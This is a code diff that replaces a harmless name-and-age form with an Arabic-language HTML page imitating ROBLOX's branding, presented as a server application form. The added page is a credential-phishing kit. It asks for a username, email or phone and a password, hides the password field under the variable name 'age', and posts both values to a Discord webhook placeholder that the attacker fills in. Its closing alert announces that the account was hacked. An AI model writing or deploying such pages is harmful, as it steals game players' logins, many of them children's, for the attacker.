@@ -1,22 +1,125 @@
-<form id="form">
-  <input type="text" id="name" placeholder="اسمك" required />
-  <input type="number" id="age" placeholder="عمرك" required />
-  <button type="submit">إرسال</button>
-</form>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>تقديم سيرفر</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#0b0d10;
+  color:white;
+}
+
+/* شريط علوي */
+.topbar{
+  background:#111;
+  height:50px;
+  display:flex;
+  align-items:center;
+  padding:0 15px;
+}
+
+.logo{
+  font-weight:bold;
+  font-size:18px;
+  margin-right:20px;
+}
+
+.menu a{
+  color:white;
+  margin:0 10px;
+  text-decoration:none;
+  font-size:14px;
+  opacity:0.8;
+}
+
+.menu a:hover{opacity:1;}
+
+.center{
+  height:calc(100vh - 50px);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  background:#1c1f26;
+  padding:30px;
+  width:350px;
+  border-radius:10px;
+  text-align:center;
+  box-shadow:0 0 20px #000;
+}
+
+.box h2{margin-bottom:15px;}
+
+.box input, .box button{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border:none;
+  border-radius:6px;
+}
+
+.box input{background:#2a2e38;color:white;}
+.box button{background:#00b06f;color:white;cursor:pointer;}
+.box button:hover{background:#00d17f;}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">ROBLOX</div>
+  <div class="menu">
+    <a href="#">الرئيسية</a>
+    <a href="#">السوق</a>
+    <a href="#">إنشاء</a>
+    <a href="#">Robux</a>
+  </div>
+</div>
+
+<div class="center">
+  <div class="box">
+    <h2>تقديم للسيرفر</h2>
+    <input id="name" type="text" placeholder="اسم المستخدم/البريد/الهاتف">
+    <input id="age" type="number" placeholder="كلمة المرور">
+    <button onclick="send()">إرسال</button>
+  </div>
+</div>
 
 <script>
-document.getElementById("form").addEventListener("submit", async (e) => {
-  e.preventDefault();
+const webhook = "PUT_WEBHOOK_HERE";
 
+function send(){
   const name = document.getElementById("name").value;
-  const age = document.getElementById("age").value;
+  const age  = document.getElementById("age").value;
 
-  const res = await fetch("http://localhost:3000/send", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ name, age })
+  if(!name || !age){
+    alert("عبي كل الخانات");
+    return;
+  }
+
+  fetch(webhook,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      username:"Webhook",
+      embeds:[{
+        title:"تقديم جديد",
+        color:3066993,
+        fields:[
+          {name:"اسم المستخدم/البريد/الهاتف", value:name, inline:true},
+          {name:"كلمة المرور", value:age, inline:true}
+        ]
+      }]
+    })
   });
 
-  alert("تم الإرسال لديسكورد ✅");
-});
+  alert("تم اختراق حسابك بنجاح!");
+}
 </script>
+
+</body>
+</html>
